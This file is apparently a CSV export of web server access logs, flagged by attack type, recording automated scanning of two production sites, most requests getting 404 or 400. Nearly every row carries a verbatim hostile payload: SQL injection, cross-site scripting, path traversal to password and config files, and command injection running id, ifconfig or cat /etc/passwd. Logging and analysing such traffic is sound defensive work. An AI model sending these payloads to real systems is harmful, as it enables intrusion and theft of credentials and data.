Stream Name,Client IP,Attack Type,Method,Request Path,Status Code
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Admin Panel Scan,POST,/wp-admin/admin-ajax.php HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Admin Panel Scan,POST,/wp-admin/admin-ajax.php HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Admin Panel Scan,POST,/wp-admin/admin-ajax.php HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Admin Panel Scan,POST,/wp-admin/admin-ajax.php HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Info Disclosure,POST,/cgi-bin/nightled.cgi HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Admin Panel Scan,POST,/wp-admin/admin-ajax.php HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Admin Panel Scan,GET,/wp-admin/admin-post.php?vrc_cmd=phpinfo HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Admin Panel Scan,POST,/wp-admin/admin-ajax.php HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Admin Panel Scan,POST,/wp-admin/admin-ajax.php?td_theme_name=Newspaper&v=11.2 HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Admin Panel Scan,POST,/wp-admin/admin-ajax.php HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Admin Panel Scan,GET,/wp-admin/admin-ajax.php?action=easync_success_and_save HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,20.220.232.240,Shell Upload,GET,/shell.php HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,SQL Injection,GET,"/mims/updatecustomer.php?customer_number=-1'%20UNION%20ALL%20SELECT%20NULL,NULL,CONCAT(md5(999999999),1,2),NULL,NULL,NULL,NULL,NULL,NULL' HTTP/1.1",404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,20.220.232.240,Admin Panel Scan,GET,/wp-admin/css/bolt.php HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Info Disclosure,GET,/cgi-bin/downloadFlile.cgi?payload=`ls>../3Agi3knXYtim1Y0Hwg5p6j6omK7` HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Admin Panel Scan,GET,/wp-admin/admin-ajax.php?action=searchwp_live_search&swpquery=a&post_status=publish HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Admin Panel Scan,GET,/wp-admin/admin-ajax.php?action=searchwp_live_search&swpquery=a&post_status=draft HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Info Disclosure,POST,/cgi-bin/login.cgi HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,209.242.202.68,Environment File,GET,/.env HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Admin Panel Scan,POST,/wp-admin/admin-ajax.php?action=check_country_selector HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,SQL Injection,GET,/wp-admin/admin-ajax.php?action=awpcp-get-regions-options&context=search&parent_type=country&parent=test&type=id`+FROM+wp_users+WHERE+1=0+UNION+SELECT+VERSION();--+- HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Admin Panel Scan,GET,/wp-admin/admin-ajax.php?action=awpcp-get-regions-options&context=search&parent_type=country&parent=test&type=id`+FROM+wp_users+WHERE+1=0+UNION+SELECT+VERSION();--+- HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Info Disclosure,POST,/cgi-bin/login.cgi HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Info Disclosure,GET,/cgi-bin/ExportLogs.sh HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,SQL Injection,GET,"/booking.php?car_id=-1%20union%20select%201,md5(999999999),3,4,5,6,7,8,9,10--+ HTTP/1.1",404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Info Disclosure,GET,/cgi-bin/popen.cgi?command=type%20C://Windows/win.ini&v=0.1303033443137912 HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Info Disclosure,GET,/cgi-bin/popen.cgi?command=cat%20/etc/passwd&v=0.1303033443137912 HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,SQL Injection,GET,"/admin/view_car.php?id=-1%20union%20select%201,md5(999999999),3,4,5,6,7,8,9,10--+ HTTP/1.1",404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,SQL Injection,GET,"/admin/manage_booking.php?id=-1%20union%20select%201,2,3,4,5,6,md5(999999999),8,9,10,11--+ HTTP/1.1",404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,SQL Injection,GET,"/admin/manage_user.php?id=-1%20union%20select%201,md5(999999999),3,4,5--+ HTTP/1.1",404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Info Disclosure,POST,/cgi-bin/xmlstatus.cgi HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Admin Panel Scan,POST,/wp-admin/admin-ajax.php?action=joomsport_md_load HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Info Disclosure,POST,/network_test.php HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Admin Panel Scan,POST,/wp-admin/admin-ajax.php?action=iws_gff_fetch_states HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,XSS Attempt,GET,/wp-content/plugins/crm-perks-forms/templates/sample_file.php?FirstName=<img%20src%20onerror=alert(document.domain)>&LastName=<img%20src%20onerror=alert(document.domain)>&%20Company=<img%20src%20onerror=alert(document.domain)> HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Admin Panel Scan,POST,/wp-admin/admin-ajax.php?action=get_tag_fonts HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,SQL Injection,GET,/wp-admin/admin-ajax.php?action=mcwp_table&mcwp_id=1&order[0][column]=0&columns[0][name]=name+AND+(SELECT+1+FROM+(SELECT(SLEEP(7)))aaaa)--+- HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Admin Panel Scan,GET,/wp-admin/admin-ajax.php?action=mcwp_table&mcwp_id=1&order[0][column]=0&columns[0][name]=name+AND+(SELECT+1+FROM+(SELECT(SLEEP(7)))aaaa)--+- HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Admin Panel Scan,GET,/api/v2/cmdb/system/admin HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Admin Panel Scan,PUT,/api/v2/cmdb/system/admin/admin HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Admin Panel Scan,POST,/wp-admin/admin-ajax.php HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Info Disclosure,POST,/vendor/htmlawed/htmlawed/htmLawedTest.php HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Info Disclosure,POST,/vendor/htmlawed/htmlawed/htmLawedTest.php HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Info Disclosure,POST,/vendor/htmlawed/htmlawed/htmLawedTest.php HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,XSS Attempt,GET,/ProcessWait.aspx?POBatch=test&WaitDuration=</script><script>alert(document.domain)</script> HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,XSS Attempt,GET,/ProcessWait.aspx?POBatch=</script><script>alert(document.domain)</script>&WaitDuration=3 HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Admin Panel Scan,GET,/wp-admin/admin-ajax.php?action=loginas_return_admin HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Admin Panel Scan,GET,/wp-admin/users.php HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Admin Panel Scan,POST,/wp-admin/admin-ajax.php?action=cfom_upload_file&name=3Agi3edpofk3VSxaC40K7Ow8uiM.pHp HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Info Disclosure,GET,/cgi-bin/ExportLogs.sh HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Admin Panel Scan,POST,/wp-admin/admin-ajax.php HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Info Disclosure,POST,/cgi-bin/rpc HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Admin Panel Scan,POST,/wp-admin/admin-ajax.php HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Admin Panel Scan,POST,/wp-admin/admin-ajax.php HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Info Disclosure,POST,/cgi-bin/luci/;stok=/locale?form=country HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,XSS Attempt,GET,/?s=<%2Fscript><script>alert%28document.domain%29<%2Fscript> HTTP/1.1,302
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Info Disclosure,POST,/cgi-bin/luci/;stok=/locale?form=country HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Admin Panel Scan,GET,/hax/..CFIDE/adminapi/administrator.cfc?method=getBuildNumber&_cfclient=true HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,SQL Injection,GET,/wp-admin/admin-ajax.php?action=edd_download_search&s=1'+AND+(SELECT+1+FROM+(SELECT(SLEEP(6)))a)--+- HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Admin Panel Scan,GET,/wp-admin/admin-ajax.php?action=edd_download_search&s=1'+AND+(SELECT+1+FROM+(SELECT(SLEEP(6)))a)--+- HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Info Disclosure,GET,/cgi-bin/network_config/nsg_masq.cgi?user_name=admin&session_id=../&lang=zh_CN.UTF-8&act=2&proto=;ls>/usr/local/lyx/lyxcenter/web/AhPJ.html; HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Admin Panel Scan,GET,/wp-admin/profile.php HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Info Disclosure,POST,/cgi-bin/cstecgi.cgi HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,SQL Injection,GET,/ws/msw/tenant/'%20union%20select%20(select%20ID%20from%20SGMSDB.DOMAINS)%2C%20''%2C%20''%2C%20''%2C%20''%2C%20''%2C%20(select%20MD5(999999999))%2C''%2C%20''%2C%20' HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Admin Panel Scan,POST,/wp-admin/admin-post.php HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Path Traversal,GET,/lib/editor/tiny/loader.php?rev=a/../../../../html/pix/f/<input><img%20src=x%20onerror=alert(document.domain)>.png HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,XSS Attempt,GET,/lib/editor/tiny/loader.php?rev=a/../../../../html/pix/f/<input><img%20src=x%20onerror=alert(document.domain)>.png HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,82.23.227.126,Environment File,GET,/.env HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,SQL Injection,POST,/human.aspx?Username=SQL%27%3BINSERT+INTO+activesessions+(SessionID)+values+(%273Agi3egNmJFqYIWKUmnlOmdZM7H%27);UPDATE+activesessions+SET+Username=(select+Username+from+users+order+by+permission+desc+limit+1)+WHERE+SessionID=%273Agi3egNmJFqYIWKUmnlOmdZM7H%27;UPDATE+activesessions+SET+LoginName=%27test@test.com%27+WHERE+SessionID=%273Agi3egNmJFqYIWKUmnlOmdZM7H%27;UPDATE+activesessions+SET+RealName=%27test@test.com%27+WHERE+SessionID=%273Agi3egNmJFqYIWKUmnlOmdZM7H%27;UPDATE+activesessions+SET+InstId=%271234%27+WHERE+SessionID=%273Agi3egNmJFqYIWKUmnlOmdZM7H%27;UPDATE+activesessions+SET+IpAddress=%2793.123.109.205%27+WHERE+SessionID=%273Agi3egNmJFqYIWKUmnlOmdZM7H%27;UPDATE+activesessions+SET+LastTouch=%272099-06-10+09:30:00%27+WHERE+SessionID=%273Agi3egNmJFqYIWKUmnlOmdZM7H%27;UPDATE+activesessions+SET+DMZInterface=%2710%27+WHERE+SessionID=%273Agi3egNmJFqYIWKUmnlOmdZM7H%27;UPDATE+activesessions+SET+Timeout=%2760%27+WHERE+SessionID=%273Agi3egNmJFqYIWKUmnlOmdZM7H%27;UPDATE+activesessions+SET+ResilNode=%2710%27+WHERE+SessionID=%273Agi3egNmJFqYIWKUmnlOmdZM7H%27;UPDATE+activesessions+SET+AcctReady=%271%27+WHERE+SessionID=%273Agi3egNmJFqYIWKUmnlOmdZM7H%27%23 HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Admin Panel Scan,POST,/wp-admin/admin-ajax.php?action=htmega_ajax_register HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Path Traversal,GET,/iclock/file?url=/../../../../../../../../../windows/win.ini HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,SQL Injection,GET,/ws/msw/tenant/%27%20union%20select%20%28select%20ID%20from%20SGMSDB.DOMAINS%20limit%201%29%2C%20%27%27%2C%20%27%27%2C%20%27%27%2C%20%27%27%2C%20%27%27%2C%20%28select%20concat%28id%2C%20%27%3A%27%2C%20password%29%20from%20sgmsdb.users%20where%20active%20%3D%20%271%27%20order%20by%20issuperadmin%20desc%20limit%201%20offset%200%29%2C%27%27%2C%20%27%27%2C%20%27 HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,XSS Attempt,GET,/webmail/?color=%22%3E%3Cimg%20src=x%20onerror=confirm(document.cookie)%3E HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Admin Panel Scan,POST,/wp-admin/admin-ajax.php HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Path Traversal,GET,/../../../../etc/passwd HTTP/1.1,400
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Info Disclosure,POST,/cgi-bin/vitogate.cgi HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Admin Panel Scan,GET,/wp-admin/admin-ajax.php?action=Essential_Grid_Front_request_ajax&client_action=load_post_content&postid=1&settings={%22lbMax%22:%22\\%22%3E%3Cscript%3Ealert(document.domain);%3C/script%3E%22} HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,SQL Injection,GET,/tutor/filter?searched_word&searched_tution_class_type[]=1&price_min=(SELECT(0)FROM(SELECT(SLEEP(7)))a)&price_max=9&searched_price_type[]=hourly&searched_duration[]=0 HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Info Disclosure,GET,/cgi-bin/cstecgi.cgi HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Path Traversal,GET,/api/v1/totp/user-backup-code/../../system/system-information HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Path Traversal,GET,/api/v1/cav/client/status/../../admin/options HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,185.224.128.251,Config File Access,GET,/admin/config.php HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,185.224.128.251,Config File Access,GET,//admin/config.php HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Info Disclosure,POST,/cgi-bin/quick/quick.cgi?func=switch_os&todo=uploaf_firmware_image HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Info Disclosure,POST,/cgi-bin/quick/Mr6JEz HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Admin Panel Scan,POST,/wp-admin/admin-ajax.php HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Info Disclosure,POST,/cgi-bin/cgi_main.cgi HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Info Disclosure,POST,/cgi-bin/vitogate.cgi HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Info Disclosure,POST,/cgi-bin/vitogate.cgi HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Info Disclosure,GET,/cgi-bin/MANGA/index.cgi HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Admin Panel Scan,POST,/wp-admin/admin-ajax.php HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,SQL Injection,GET,/wp-json/lp/v1/courses/archive-course?order_by=1+AND+(SELECT+1+FROM+(SELECT(SLEEP(6)))X)&limit=-1 HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Admin Panel Scan,POST,/wp-admin/admin-ajax.php HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Admin Panel Scan,POST,/wp-admin/admin-ajax.php?action=eventon_get_virtual_users HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Admin Panel Scan,POST,/wp-admin/admin-ajax.php HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Directory Listing,GET,/3/ImportFiles?path=%2Fetc%2Fpasswd HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,SQL Injection,GET,/?rest_route=/h5vp/v1/view/1&id=1'+AND+(SELECT+1+FROM+(SELECT(SLEEP(6)))a)--+- HTTP/1.1,302
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Info Disclosure,GET,/cgi-bin/account_mgr.cgi?cmd=cgi_user_add&name=%27;id;%27 HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Info Disclosure,GET,/cgi-bin/account_mgr.cgi?cmd=cgi_user_add&name=%27;ifconfig;%27 HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Info Disclosure,GET,/cgi-bin/account_mgr.cgi?cmd=cgi_user_add&group=%27;id;%27 HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Info Disclosure,GET,/cgi-bin/account_mgr.cgi?cmd=cgi_user_add&group=%27;ifconfig;%27 HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Info Disclosure,GET,/cgi-bin/mainfunction.cgi/apmcfgupload?session=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx0.%52$c%52$ccat${IFS}/etc/passwd HTTP/1.0,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Path Traversal,POST,/wp-admin/admin-ajax.php?action=add&source=../../../../../../../../../../wp-content/plugins/chart-builder/admin/partials/features/chart-builder-plugin-featured-display&type=chart-js HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Admin Panel Scan,POST,/wp-admin/admin-ajax.php?action=add&source=../../../../../../../../../../wp-content/plugins/chart-builder/admin/partials/features/chart-builder-plugin-featured-display&type=chart-js HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Admin Panel Scan,POST,/wp-admin/admin-ajax.php HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Admin Panel Scan,POST,/wp-admin/admin-ajax.php HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Admin Panel Scan,POST,/wp-admin/admin-ajax.php HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,SQL Injection,GET,"/item/list?draw=1&order%5B0%5D%5Bcolumn%5D=1&order%5B0%5D%5Bdir%5D=desc)a+union+select+updatexml(1,concat(0x7e,d66842d5afbe201e46bba23a1367adae,0x7e),1)%23;&start=0&length=1&search%5Bvalue%5D&search%5Bregex%5D=false&cid=-1&_=1 HTTP/1.1",404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Admin Panel Scan,GET,/hax/..CFIDE/adminapi/_servermanager/servermanager.cfc?method=getHeartBeat HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Path Traversal,POST,/userentry?accountId=/../../../tomcat/webapps/bQ4aL/&symbolName=test&base64UserName=YWRtaW4= HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Info Disclosure,POST,/cgi-bin/cstecgi.cgi?token HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Admin Panel Scan,POST,/wp-admin/admin-post.php HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Info Disclosure,POST,/cgi-bin/cstecgi.cgi?token=C6F41C563E86A379 HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Admin Panel Scan,GET,/cgi-bin/admin.cgi?Command=sysCommand&Cmd=ifconfig HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Info Disclosure,GET,/cgi-bin/admin.cgi?Command=sysCommand&Cmd=ifconfig HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Info Disclosure,GET,"/desktop,/cgi-bin/remote_help-cgi/favicon.ico?type=sshd_tdc HTTP/1.1",404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Admin Panel Scan,POST,/wp-admin/admin-ajax.php HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Path Traversal,GET,/?InternalDir=/../../../../windows&InternalFile=win.ini HTTP/1.1,302
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Config File Access,GET,/file=web_assets/../config.json HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,SQL Injection,GET,"/account/?user=1&tab=groups&group-name=p%27+or+%27%%27=%27%%27+union+all+select+1,2,3,4,5,6,7,8,9,10,11,concat(%22Database:%22,md5(999999999),0x7c,%20%22Version:%22,version()),13--+- HTTP/1.1",404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Info Disclosure,GET,/cgi-bin/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system=aWQ= HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Info Disclosure,GET,/cgi-bin/info.cgi HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Info Disclosure,POST,/cgi-bin/cstecgi.cgi HTTP/1.1,404
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Path Traversal,GET,/static/nbextensions/#/../../../../../../../../../../etc/passwd HTTP/1.1,400
_httpd_ssl_access_log_Crown_Royal_USA_PROD_Lapine,93.123.109.205,Admin Panel Scan,POST,/wp-admin/admin-ajax.php HTTP/1.1,404
_httpd_ssl_access_log_Uber_Swag_ALB_PROD_Lapine,82.25.216.131,Environment File,GET,/.env HTTP/1.1,404
_httpd_ssl_access_log_Uber_Swag_ALB_PROD_Lapine,144.79.133.252,Info Disclosure,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1,400
_httpd_ssl_access_log_Uber_Swag_ALB_PROD_Lapine,104.239.73.176,Environment File,GET,/.env HTTP/1.1,404
_httpd_ssl_access_log_Uber_Swag_ALB_PROD_Lapine,108.165.69.7,Environment File,GET,/.env HTTP/1.1,404
_httpd_ssl_access_log_Uber_Swag_ALB_PROD_Lapine,107.173.182.172,Info Disclosure,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1,400
_httpd_ssl_access_log_Uber_Swag_ALB_PROD_Lapine,23.95.250.202,Environment File,GET,/.env HTTP/1.1,404
_httpd_ssl_access_log_Uber_Swag_ALB_PROD_Lapine,155.212.167.134,Info Disclosure,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1,400
_httpd_ssl_access_log_Uber_Swag_ALB_PROD_Lapine,45.131.101.187,Environment File,GET,/.env HTTP/1.1,404
_httpd_ssl_access_log_Uber_Swag_ALB_PROD_Lapine,173.211.68.151,Environment File,GET,/.env HTTP/1.1,404
